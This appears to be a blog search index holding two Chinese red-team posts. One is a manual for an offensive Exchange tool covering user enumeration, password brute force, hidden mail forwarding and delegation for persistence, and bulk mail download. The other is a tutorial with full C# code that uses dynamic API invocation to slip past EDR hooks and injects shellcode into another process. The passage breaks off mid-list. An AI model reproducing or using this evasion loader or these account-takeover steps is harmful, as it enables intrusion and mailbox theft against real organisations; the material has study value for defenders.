<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[【使用说明】SharpExchangeKing]]></title>
    <url>%2F2023%2F06%2F%E3%80%90%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E%E3%80%91SharpExchangeKing%2F</url>
    <content type="text"><![CDATA[摘要：针对本地 Windows Exchange Server 的 SharpExchangeKing 版本已经编写完成。 0x00 前言针对本地 Windows Exchange Server 的 SharpExchangeKing 版本已经编写完成。 主界面如下所示： SharpExchangeKing 的功能依次如下所示： 基本信息收集 邮箱账户枚举 邮箱账号密码暴力破解 一些在获取邮箱账号后的操作，主要是针对邮箱文件夹的设置，比如委派 检测委派 根据搜索条件对邮件进行下载 浏览共享 特别提醒：要想使用以上功能，在输入 Target 后，必须选择点击 GoGoGo，并且是通过获取基本信息后，才能正常使用，否则无法使用。在 Target 有更改时，也必须重新点击 GoGoGo。 PS：我也不清楚为什么 Defender 会将 SharpExchangeKing 标记为特洛伊木马。并且使用 DefenderCheck 检测是正常的。 0x01 Info 模块该模块主要是获取以下信息： 服务器所在内网域的域名及 Windows Server 版本，是根据之前编写的 NTLMSSP 解析工具。 获取 Exchange 发行版本信息，包含了发行时间。 尝试获取 Exchange 服务器内网 IP。 从 SSL 证书中获取一些数据，这个数据可以辅助判断该目标是否是我们要打的。 根据发行时间跟漏洞修补时间对比得出可能存在的漏洞。 效果如下所示： 当在本地 ExchangeReleaseVersion.data 文件中找不到版本数据时，会前往微软官网获取 Exchange 的版本数据。因此，此时确保当前网络可访问 https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019。 0x02 Mailbox 模块模块说明：该模块主要是验证输入的邮箱用户是否存在。当前，该模块提供了 3 个可选择的方法，它们分别是： 方法 描述 缺点 SMTP - 对输入的用户名有要求，需要提供完整的邮箱名，比如 rcoil@rowteam.lab - 狗都不用 - 如果目标邮服配置了 Catch-all 邮箱，则 SMTP 无法使用。 - 不支持多线程 OWADate - 支持 rcoil@rowteam.lab 用户名格式 - 仅输入用户名 rcoil，则在请求时默认是 rowteam\rcoil - 成功验证写入 owadate_success.txt - OWA 接口存在 MFA 时，则 OWADate 无法使用。 - 对网络条件要求，得多尝试几次 - 有些环境仅支持单种格式，两种格式需要反复尝试 EASDate - 支持 rcoil@rowteam.lab 用户名格式- 仅输入用户名 rcoil，则在请求时默认是 rowteam\rcoil- 成功验证写入 easdate_success.txt - 对网络条件要求，得多尝试几次- 有些环境仅支持单种格式，两种格式需要反复尝试 以上三种方法都支持批量，将需要检测的用户写入文件即可。以下是使用 EASData 的测试结果： 0x03 Pwd Brute 模块模块说明：该模块为密码爆破，目前仅支持 EWS 接口的验证，且该接口支持 NLTM 验证，成功验证写入 brute_success.txt。 账号密码混杂组合支持 5 种模式： 模式 写入说明 单个账号单个密码 UserName 和 PassWord 分别填写账号密码即可。 单个账号多个密码 UserName 填写账号，PassWord 填写包含密码的本地文本路径。 多个账号单个密码 UserName 填写包含账号的本地文本路径，PassWord 填写密码。 多个账号多个密码 UserName 填写包含账号的本地文本路径，PassWord 填写包含密码的本地文本路径。 批量验证账号密码 UserName 填写包含账号密码的本地文本路径，格式必须为“用户名:密码”。 PS：如果以上的密码是 NTLM 格式，则勾选 NTLM，不支持明文和 NTLM 同时使用。 0x04 Setting 模块模块说明：粗略的充当一个权限维持的作用。主要是对当前邮箱的收信箱做转发及委派访问权限。 界面大致如下所示： 使用说明： Auto：必须为 “username:password” 格式。该字段支持批量、 Value1：根据 Funtion 选择。必须是 username 的邮箱名，比如当前登陆的是 rcoil，它的用户邮箱名为 rcoil@rowteam.me。 Value2：根据 Funtion 选择对应值。 这个模块当前支持 8 个函数功能，它们分别是： 方法 描述 GetMailLists 从全局地址簿获取邮箱账号数据，成功则输出到 MaiLists.txt 文件 GetInboxRules 读取用户 Value1 规则信息，从返回结果中能够获得规则对应的 RuleID。 AddForwardToRecipients 创建用户 Value1 转发邮件至用户 Value2 的规则。 DelForwardToRecipients 根据 RuleID 删除用户 Value1 的指定转发规则。 GetInboxPermissions 查看用户 Value1 收件箱的访问权限。 AddDelegateEditorToInboxPermissions 添加用户 Value2 对用户 Value1 收件箱的完全访问权限。 RemoveDelegateEditorToInboxPermissions 移除用户 Value2 对用户 Value1 收件箱的访问权限。 UpdateFolderDefaultToPermissions 设置所有用户都可以访问 username 的所有邮件。 它们都是只能作用自身，无法为他人设置转发及委派。 0x05 CheckDelegate 模块模块说明：主要是针对 UpdateFolderDefaultToPermissions 方法中的设置进行一个检测。如果成功检测出，那么就可以在 MailStore 模块中读取相应邮件文件夹的邮件。 Query 支持单个/多个邮箱用户 Query 支持文件 检测出来什么文件夹可访问，那么就可以读取相对应的文件夹。如果检测出 msgfolderroot，那么，可访问所有邮件。 在输入正确的邮箱，有些环境可能会提示 The SMTP address has no mailbox associated with it.也就是 SMTP 地址没有与其关联的邮箱，具体原因未明。这个问题在 MailStore 同意存在。 0x06 MailStore 模块模块说明：可读取当前用户的所有邮件，也可读取受委派的邮箱的邮件。 Value 输入框支持两种模式： 基于时间区间：格式为 2020/05/26-2023/06/02 基于关键字：格式为 VPN,密码，多个关键字以逗号隔开 Delegete 输入框支持两种格式： 直接输入单个或多个邮箱名称，多个邮箱以逗号隔开 支持文件列表 仅下载附件 读取委派用户的邮箱 关键字同理，就不演示了。 0x07 BroseShare 模块模块说明：当已知文件共享的 UNC 路径，且当前用户可访问时，可使用该模块浏览共享内的文件，并且支持下载。 当然，如果当前用户权限足够的话，也可以访问很多的东西，如下图： 支持右键下载及双击下载。该模块存在一个问题：太大的文件无法下载，这个大小的值未验证具体是多少，但 100M 以内的肯定可以下载。 0x08 免责声明本工具仅面向合法授权的企业安全建设行为，例如企业内部攻防演练、漏洞验证和复测，如您需要测试本工具的可用性，请自行搭建靶机环境。 在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标使用。 如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>King</tag>
        <tag>编程之道</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【知识回顾】关于 CSharp 中调用非托管代码的方法]]></title>
    <url>%2F2020%2F12%2F%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E5%85%B3%E4%BA%8E%20CSharp%20%E4%B8%AD%E8%B0%83%E7%94%A8%E9%9D%9E%E6%89%98%E7%AE%A1%E4%BB%A3%E7%A0%81%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[本文并非从专业开发的角度去阐述托管/非托管的概念及托管代码如何调用非托管代码，而是从日常的工具编写中及使用中遇到的一些问题，带着解决问题的态度出发，去看待这么一个过程。 整个过程并非专业解析，而只是助于我们理解罢了。 0x00 前言托管/非托管是微软的 .NET Framework 中特有的概念，其中，非托管代码也叫本地（Native）代码。与 Java 中的机制类似，也是先将源代码编译成中间代码（MSIL，Microsoft Intermediate Language），然后再由 .NET 中的 CLR 将中间代码编译成机器代码。 在 Csharp 中，托管代码引用非托管代码的方式一般有两种： P/Invoke（平台调用） Delegate（委托）-&gt; 后续转换为 D/Invoke（动态调用） 而个人在日常工具编写的过程中，经常用到的调用方式是 P/Invoke。这种方式普遍应用于各大工具开发中，对于这种方式，从攻击角度来看，存在一些缺陷： 通过 P/Invoke 进行的任何 Windows API 引用都将在 .NET 程序集的 “导入表” 中产生一个相应的条目； 在存在任何可监视 API 调用（如通过 API Hooking）的安全产品，都会在 P/Invoke 调用任何 API 上看到警告/阻止，这个 Hook 方式称之为 IAT hooking。 而动态调用的目的是提供一种访问（调用）这些 Windows API 的替代方案，而不会留下这些特定的指标（并不是说动态调用没有自身的指标）。 但是关于 Delegate 的使用，我们在大多数利用工具的开发中，很少人会去用到。但是如果去搜索这东西，会发现很早就有人使用它来写了东西，因此我们可以很快的找到资料进行学习。Delegate 主要用于解决 Csharp 和 DLL 之间的数据传送问题： 1在这种混合编程中，Csharp 和 DLL 之间如何进行数据传送？这个问题起始很复杂，像 int，double 这种基本的数据类型，是很好传递的。到了 byte 和 char，就有点复杂了，更复杂的还有 string 和 stringBuilder，以及结构体的传递等。 若传递的是函数指针，有两种方法： 由于 Csharp 中没有函数指针的概念，因此采用委托（Delegate）的方式，使用 Intptr 存储指针，并使用 ref 获得地址（&amp;）; 另一种是在 Csharp 中编写非托管的代码，用 unsafe 声明： 12345unsafe&#123; // 非托管代码 // 在非托管代码中，即可进行指针相关的操作。&#125; 因此本文会对 P/Invoke，Delegate 两种调用方式进行一些说明，并说明动态调用为什么可以绕过 IAT hooking。 0x01 IAT hooking Hook 的概念就不累述了 即使是基于 CS 的 execute-assembly 等内存执行方法，EDR 通过 Hook 进程，也能捕获到进攻性行为。针对这种情况，@CCob 巨佬在他的文章中也给了一个非常奈斯的例子，证明的这个 POC，以及如何绕过这种 Hooking。一个高效的 EDR，会尽可能的 Hooking 底层函数，如 NT 级别的 Win32 API。下图是一个很好的例子，充分阐明了 EDR 的工作原理（其中 ntdll.dll 负责向 Windows 内核进行系统调用）： EDR 的 Hook 方式主要有两种： IAT hooking：IAT 是 Import Address Table 的缩写。每个可执行程序都拥有该 IAT 区域，程序运行时，PE 装载器会将 Win32 API 的函数地址记录到 IAT 区域，在 EDR 的 hook.dll 注入到程序后，当程序调用到记录在内的函数时，则跳转至 hook.dll（至于是什么函数才跳转，由 EDR 决定）。 Inline hooking：是一种通过修改机器码的方式来实现 Hook 的技术。 我们这就讲讲 IAT hooking 就好。关于 IAT hooking，可一看看下面的图： 在此示例中，就是简单的调用一个 MessageBoxA 的程序，该程序将会在 Import Address Table 中查找 MessageBoxA 的地址，以便它能够顺利的运行。 我们不知道的是， EDR 参与了其中，其实 EDR 替换了程序中的 IAT 区域内容。在程序调用 MessageBoxA 时，实际上该调用已经被 EDR 强制跳转到它自身 dll 的地址，因此最后是由 EDR 判断传递的数据是否是恶意的，还是正常的。如果是恶意代码，则拦截执行，反之。 从进攻角度来看，我们可以利用系统调用来绕过这些 Hook 方法，比较有参考的例子有： MDSec 的 Firewalker @CCob 的 Sharpblock 0x02 Platform InvocationCsharp 能够像 C/C++ 一样可以调用 Win32 API 函数，大部分调用的方式是： 1234567891011121314151617181920using System;using System.Runtime.InteropServices;namespace DemoApp&#123; static class Program &#123; // Import user32.dll (containing the function we need) and define // the method corresponding to the native function. [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)] private static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType); public static void Main(string[] args) &#123; // Invoke the function as a regular managed method. MessageBox(IntPtr.Zero, "Command-line message box", "Attention!", 0); &#125; &#125;&#125; 在 .NET 中，这个调用过程被称为 Platform Invoking，简称 P/invoke 。该机制允许 .NET 应用程序方位非托管库（DLL）中的数据和 API。通过使用 P/invoke，Csharp 开发人员可以轻松地调用标准 Win32 API。 该过程主要是利用 System.Runtime.InteropServices 命名空间来完成，且由 CLR 管理。下图显示了 P/invoke 中非托管代码与托管代码之间的联系及过程： 当 P/invoke 调用非托管函数时，它将执行以下操作序列： 找到包含函数的 DLL； 将 DLL 加载到内存中； 在内存中找到该函数的地址，并将其参数压入堆栈，根据需要封送数据； 将控制权转移到非托管功能。 P/invoke 会将由非托管函数生成的异常抛出给托管调用方。 但是，利用 .NET 也存在操作上的缺点（第一小节中已经说明）。由于是 CLR 负责将 .NET 翻译成机器代码（语言），而可执行文件并没有直接翻译成这种代码。因此，可执行文件将整个代码库存储它的汇编代码中，因此稍微逆向该可执行文件，就可以看到全部信息。比如以下的一些信息： 0x03 Delegate现在好多的工具都开始以动态调用/执行的方式进行编写，这是非常有趣的一点，也是非常值得我们去学习。D/invoke 允许我们调用 P/invoke 所使用的 API，但它不是静态导入，而是动态导入。这样子就不会将 Win32 API 地址写入 Import Address Table 中，这就意味着我们完全的绕过了 IAT hooking。所以如果程序是使用了动态调用，我们是无法查看程序的导出表的。 那么，我们怎么实现动态调用呢？与其使用 P/Invoke 导入我们想调用的 API，不如将 DLL 手动加载到内存中。此后，我们会得到一个指向该 DLL 中的一个函数的指针，后续可以在传参的同时从指针中调用该函数。 那么说到指针，不得不说 C# 中的 Delegate（委托）了，该部分内容在第一小节中有讲到。因此我们直接看看具体是怎么实现的。 我们的目的是在内存中调用非托管代码。 可以通过 Delegate 的来实现这一点。.NET 包含了 Delegate API，作为在类中包装方法/函数的一种方式。如果你们曾经使用反射来枚举类中的方法，那么你可以自己观察一下，实际上就是一种 Delegate 的形式。 Delegate API 有很多奇妙的功能，比如可以从一个函数的指针实例化一个 Delegate，并在传递参数的同时动态调用该函数。这里主要用的函数是：GetDelegateForFunctionPointer 该函数原型为： 1public static Delegate GetDelegateForFunctionPointer (IntPtr ptr, Type t); 需要两个参数，分别为： IntPtr ptr：要转换的非托管函数指针。 Type t：要返回的委托人的类型，也就是要传入的非托管代码的函数原型。 当看到 Type t 这个类型参数时，可能会不理解。这其实就是操作者传入要调用的非托管代码的函数原型的地方。这可以让 Delegate 知道当它调用函数时如何设置 CPU 寄存器和栈。 如果你记得在 P/Invoke 中，肯定用过类似这样的方式来设置函数： 123456[DllImport("kernel32.dll")]public static extern IntPtr OpenProcess( ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, uint dwProcessId); 定义一个委托的方式与此类似，可以像定义变量一样定义一个委托。同时还要指定由委托人封装的函数时使用的调用约定（C++的标准调用约定是 StdCall），此处的调用约定务必一致，要不然会出现堆栈被破坏的情况。 123456[UnmanagedFunctionPointer(CallingConvention.StdCall)]public delegate IntPtr OpenProcess( uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId); 一个函数原型就定义完成。 接下来就看看怎么获取函数的指针了。 如果了解一些 PE 结构，可以知道由于所有的程序在初始化运行时，本身都会加载一些模块（库），这些模块是保证程序能正常运行的基本要素。因此可直接在当前进程中查找所需模块，即可获取到基址。实现如下： 在获取模块基址之后，通过遍历模块导出表来解析函数的地址，具体实现，可以在 4.2 章节看到。这里还有一个要注意的问题，那就是如果程序在初始化时，所调用的库并没有在预加载的模块里面，那么上面的代码就不会返回结果。这种情况就需要从磁盘中查找所需 DLL。 基础条件已经满足，因此直接套用即可，这部分内容，TheWover 已经写好了库。 TheWover 写了一篇关于为什么使用 D/invoke 而非 P/invlke 的原因的文章，强烈推荐。并且他还发布了一个 NuGet 包，该库其实就是一个 Delegate 库和函数包装器，目前基本满足平时的工具开发需求，它实现了定义结构及功能，只需要引用即可。 0x04 示例上面说了 TheWover 发布了他的 DInvoke 项目，这个项目主要是帮我们定义处理对应的结构及功能，否则需要自己去定义对应的结构。如果不想使用这个项目，那么自己手动构造即可，这个后续会说到。 4.1、使用 DInvoke这里直接使用官方的示例。下面的例子演示了如何使用 DInvoke 动态查找和调用一个 DLL 的函数地址： 获取 ntdll.dll 的基址。当它被初始化时，它被加载到每个 Windows 进程中，所以我们知道它已经被加载了。因此，我们可以搜索 PEB 的加载模块列- 表来找到它的引用。一旦我们从 PEB 中找到了它的基址，我们就输出地址； 给定一个函数名称，使用 GetLibraryAddress 在 ntdll.dll 中找到一它的地址； 给定一个函数的序号，使用 GetLibraryAddress 在 ntdll.dll 中找到一它的地址； 给定一个函数的 HMACMD5 值，使用 GetLibraryAddress 在 ntdll.dll 中找到一它的地址； 在获取 ntdll.dll 的前提下，使用 GetExportAddress 在内存中按给定的函数名查找地址。 再看看官方的另一个例子。在下面的示例中，我们先使用 P/Invoke 调用 OpenProcess。然后，我们再使用 D/Invoke 方式调用它（多种），并证明任何一种动态调用的机制都成功执行了非托管代码且绕过了 API hooking。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130///Author: TheWoverusing System;using System.Runtime.InteropServices;using Data = DInvoke.Data;using DynamicInvoke = DInvoke.DynamicInvoke;using ManualMap = DInvoke.ManualMap;namespace SpTestcase&#123; class Program &#123; [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr OpenProcess( Data.Win32.Kernel32.ProcessAccessFlags processAccess, bool bInheritHandle, uint processId ); static void Main(string[] args) &#123; // Details String testDetail = @" #=================&gt; # Hello there! # I demonstrate API Hooking bypasses # by calling OpenProcess via # PInvoke then DInvoke. # All handles are requested with # PROCESS_ALL_ACCESS permissions. #=================&gt; "; Console.WriteLine(testDetail); //PID of current process. uint id = Convert.ToUInt32(System.Diagnostics.Process.GetCurrentProcess().Id); //Process handle IntPtr hProc; // Create the array for the parameters for OpenProcess object[] paramaters = &#123; Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, false, id &#125;; // Pause execution Console.WriteLine("[*] Pausing execution.."); Console.ReadLine(); ////////////////////////////////////////////////////////////////////////////////////////////////////////// // 以 P/Invoke 方式调用 OpenProcess Console.WriteLine("[?] Call OpenProcess via PInvoke ..."); hProc = OpenProcess(Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, false, id); Console.WriteLine("[&gt;] Process handle : " + string.Format("&#123;0:X&#125;", hProc.ToInt64()) + "\n"); // Pause execution Console.WriteLine("[*] Pausing execution.."); Console.ReadLine(); ////////////////////////////////////////////////////////////////////////////////////////////////////////// // 使用GetLibraryAddress调用OpenProcess (underneath the hood) Console.WriteLine("[?] Call OpenProcess from the loaded module list using System.Diagnostics.Process.GetCurrentProcess().Modules ..."); hProc = DynamicInvoke.Win32.OpenProcess(Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, false, id); Console.WriteLine("[&gt;] Process handle : " + string.Format("&#123;0:X&#125;", hProc.ToInt64()) + "\n"); // Pause execution Console.WriteLine("[*] Pausing execution.."); Console.ReadLine(); ////////////////////////////////////////////////////////////////////////////////////////////////////////// // 在 PEB 中查找指定函数名称的地址 Console.WriteLine("[?] Specifying the name of a DLL (\"kernel32.dll\"), search the PEB for the loaded module and resolve a function by walking the export table in-memory..."); Console.WriteLine("[+] Search by name --&gt; OpenProcess"); IntPtr pkernel32 = DynamicInvoke.Generic.GetPebLdrModuleEntry("kernel32.dll"); IntPtr pOpenProcess = DynamicInvoke.Generic.GetExportAddress(pkernel32, "OpenProcess"); // Call OpenProcess hProc = (IntPtr)DynamicInvoke.Generic.DynamicFunctionInvoke(pOpenProcess, typeof(DynamicInvoke.Win32.Delegates.OpenProcess), ref paramaters); Console.WriteLine("[&gt;] Process Handle : " + string.Format("&#123;0:X&#125;", hProc.ToInt64()) + "\n"); // Pause execution Console.WriteLine("[*] Pausing execution.."); Console.ReadLine(); ////////////////////////////////////////////////////////////////////////////////////////////////////////// // 手动映射 kernel32.dll // 在 PEB 中查找指定函数名称的地址 Console.WriteLine("[?] Manually map a fresh copy of a DLL (\"kernel32.dll\"), and resolve a function by walking the export table in-memory..."); Console.WriteLine("[+] Search by name --&gt; OpenProcess"); Data.PE.PE_MANUAL_MAP moduleDetails = ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\kernel32.dll"); Console.WriteLine("[&gt;] Module Base : " + string.Format("&#123;0:X&#125;", moduleDetails.ModuleBase.ToInt64()) + "\n"); //Call OpenProcess hProc = (IntPtr)DynamicInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "OpenProcess", typeof(DynamicInvoke.Win32.Delegates.OpenProcess), paramaters); Console.WriteLine("[&gt;] Process Handle : " + string.Format("&#123;0:X&#125;", hProc.ToInt64()) + "\n"); // Pause execution Console.WriteLine("[*] Pausing execution.."); Console.ReadLine(); ////////////////////////////////////////////////////////////////////////////////////////////////////////// // 使用模块重载映射 kernel32.dll // 在 PEB 中查找指定函数名称的地址 Console.WriteLine("[?] Use Module Overloading to map a fresh copy of a DLL (\"kernel32.dll\") into memory backed by another file on disk. Resolve a function by walking the export table in-memory..."); Console.WriteLine("[+] Search by name --&gt; OpenProcess"); moduleDetails = ManualMap.Overload.OverloadModule("C:\\Windows\\System32\\kernel32.dll"); Console.WriteLine("[&gt;] Module Base : " + string.Format("&#123;0:X&#125;", moduleDetails.ModuleBase.ToInt64()) + "\n"); //Call OpenProcess hProc = (IntPtr)DynamicInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "OpenProcess", typeof(DynamicInvoke.Win32.Delegates.OpenProcess), paramaters); Console.WriteLine("[&gt;] Process Handle : " + string.Format("&#123;0:X&#125;", hProc.ToInt64()) + "\n"); // Pause execution Console.WriteLine("[*] Pausing execution.."); Console.ReadLine(); ////////////////////////////////////////////////////////////////////////////////////////////////////////// Console.WriteLine("[!] Test complete!"); // Pause execution Console.WriteLine("[*] Pausing execution.."); Console.ReadLine(); &#125; &#125;&#125; 为了更好的说明实验结果，我们使用 API Monitor v2 比作 EDR，并钩住 kernel32.dll!OpenProcess，然后通过 API Monitor 运行该示例程序。接下来仔细观察那些用 PROCESS_ALL_ACCESS Flag 的调用，然后根据基址进行校对。结果如下图所示： 结果很明显，P/Invoke 的方式可以成功捕获，但使用 D/Invoke、手动映射和模块重载映射时，未成功捕获。 4.2、手动构造为了更好的理解动态调用，我们可以尝试手动进行构造，这里我们使用 【知识回顾】进程注入-第一部分 中的代码注入代码，由 P/Invoke 的方式转由 D/Invoke 调用。 1234567891011121314151617public class DELEGATES&#123; [UnmanagedFunctionPointer(CallingConvention.StdCall)] public delegate IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId); [UnmanagedFunctionPointer(CallingConvention.StdCall)] public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [UnmanagedFunctionPointer(CallingConvention.StdCall)] public delegate Boolean WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten); [UnmanagedFunctionPointer(CallingConvention.StdCall)] public delegate IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId); [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate Boolean CloseHandle(IntPtr hObject);&#125; 关键实现类 DemoDInvoke： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112public class DemoDInvoke&#123; /// &lt;summary&gt; /// 遍历当前进程所加载的模块，获取指定模块的基址。 /// 这个基址可以传递给 GetProcAddress/LdrGetProcedureAddress，也可以用于手动导出解析 /// 该函数使用 .NET 的 System.Diagnostics.Process类 /// &lt;/summary&gt; /// &lt;author&gt;Ruben Boonen (@FuzzySec)&lt;/author&gt; /// &lt;param name="DLLName"&gt;指定的 DLL 名称 (e.g. "ntdll.dll").&lt;/param&gt; /// &lt;returns&gt; 返回 IntPtr 形式的 DLL 基址，如果没有找到模块，则返回 IntPtr.Zero&lt;/returns&gt; public static IntPtr GetLoadedModuleAddress(string DLLName) &#123; ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules; foreach (ProcessModule Mod in ProcModules) &#123; if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower())) &#123; return Mod.BaseAddress; &#125; &#125; return IntPtr.Zero; &#125; /// &lt;summary&gt; /// 从当前进程加载的 DLL 中获取函数指针 /// &lt;/summary&gt; /// &lt;author&gt;Ruben Boonen (@FuzzySec)&lt;/author&gt; /// &lt;param name="DLLName"&gt;指定的 DLL 名称 (e.g. "ntdll.dll").&lt;/param&gt; /// &lt;param name="FunctionName"&gt;导出函数名.&lt;/param&gt; /// &lt;returns&gt;返回 IntPtr 形式的函数指针&lt;/returns&gt; public static IntPtr GetLibraryAddress(string DLLName, string FunctionName) &#123; IntPtr hModule = GetLoadedModuleAddress(DLLName); if (hModule == IntPtr.Zero &amp;&amp; CanLoadFromDisk) &#123; hModule = LoadModuleFromDisk(DLLName); if (hModule == IntPtr.Zero) &#123; throw new FileNotFoundException(DLLName + ", unable to find the specified file."); &#125; &#125; else if (hModule == IntPtr.Zero) &#123; throw new DllNotFoundException(DLLName + ", Dll was not found."); &#125; return GetExportAddress(hModule, FunctionName); &#125; /// &lt;summary&gt; /// 给定一个模块基址，通过手动遍历模块导出表来解析函数的地址。 /// &lt;/summary&gt; /// &lt;author&gt;Ruben Boonen (@FuzzySec)&lt;/author&gt; /// &lt;param name="ModuleBase"&gt;指向当前进程中模块加载基址的指针&lt;/param&gt; /// &lt;param name="ExportName"&gt;要搜索的导出函数名 (e.g. "NtAlertResumeThread").&lt;/param&gt; /// &lt;returns&gt;返回 IntPtr 形式的函数指针.&lt;/returns&gt; public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName) &#123; IntPtr FunctionPtr = IntPtr.Zero; try &#123; // 遍历内存中的 PE 标头 Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C)); Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14)); Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18; Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader); Int64 pExport = 0; if (Magic == 0x010b) &#123; pExport = OptHeader + 0x60; &#125; else &#123; pExport = OptHeader + 0x70; &#125; // 读取 -&gt; IMAGE_EXPORT_DIRECTORY Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport); Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10)); Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14)); Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18)); Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C)); Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20)); Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24)); // 遍历（Loop the array of export name RVA's） for (int i = 0; i &lt; NumberOfNames; i++) &#123; string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4)))); if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase)) &#123; Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase; Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase)))); FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA); break; &#125; &#125; &#125; catch &#123; // Catch parser failure throw new InvalidOperationException("Failed to parse module exports."); &#125; if (FunctionPtr == IntPtr.Zero) &#123; // Export not found throw new MissingMethodException(ExportName + ", export not found."); &#125; return FunctionPtr; &#125;&#125; 主类： 1234567891011121314151617181920212223242526272829303132public class Program &#123; static void Main(string[] args) &#123; // msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b "\x00" -f csharp byte[] shellcode = &#123; 0x31, 0x33, 0x33, 0x37 &#125;; int pid = Convert.ToInt32(args[0]); IntPtr pointer = DemoDInvoke.GetLibraryAddress("kernel32.dll", "OpenProcess"); DELEGATES.OpenProcess OpenProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.OpenProcess)) as DELEGATES.OpenProcess; IntPtr pHandle = OpenProcess((uint)STRUCTS.ProcessAccessRights.All, false, (uint)pid); pointer = DemoDInvoke.GetLibraryAddress("kernel32.dll", "VirtualAllocEx"); DELEGATES.VirtualAllocEx VirtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualAllocEx)) as DELEGATES.VirtualAllocEx; IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)shellcode.Length, (uint)STRUCTS.MemAllocation.MEM_RESERVE | (uint)STRUCTS.MemAllocation.MEM_COMMIT, (uint)STRUCTS.MemProtect.PAGE_EXECUTE_READWRITE); pointer = DemoDInvoke.GetLibraryAddress("kernel32.dll", "WriteProcessMemory"); DELEGATES.WriteProcessMemory writeProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.WriteProcessMemory)) as DELEGATES.WriteProcessMemory; if (writeProcessMemory(pHandle, rMemAddress, shellcode, (uint)shellcode.Length, out UIntPtr bytesWritten)) &#123; pointer = DemoDInvoke.GetLibraryAddress("kernel32.dll", "CreateRemoteThread"); DELEGATES.CreateRemoteThread CreateRemoteThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.CreateRemoteThread)) as DELEGATES.CreateRemoteThread; IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, rMemAddress, IntPtr.Zero, 0, out UIntPtr lpThreadId); pointer = DemoDInvoke.GetLibraryAddress("kernel32.dll", "CloseHandle"); DELEGATES.CloseHandle CloseHandle = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.CloseHandle)) as DELEGATES.CloseHandle; CloseHandle(hRemoteThread); &#125; &#125; &#125; 最后补上一些 STRUCTS，代码就完整了。 编译代码后，同上使用 API Monitor v2 比做 EDR，并且钩完所涉及的 API，它们分别是： kernel32.dll!OpenProcess kernel32.dll!VirtualAllocEx 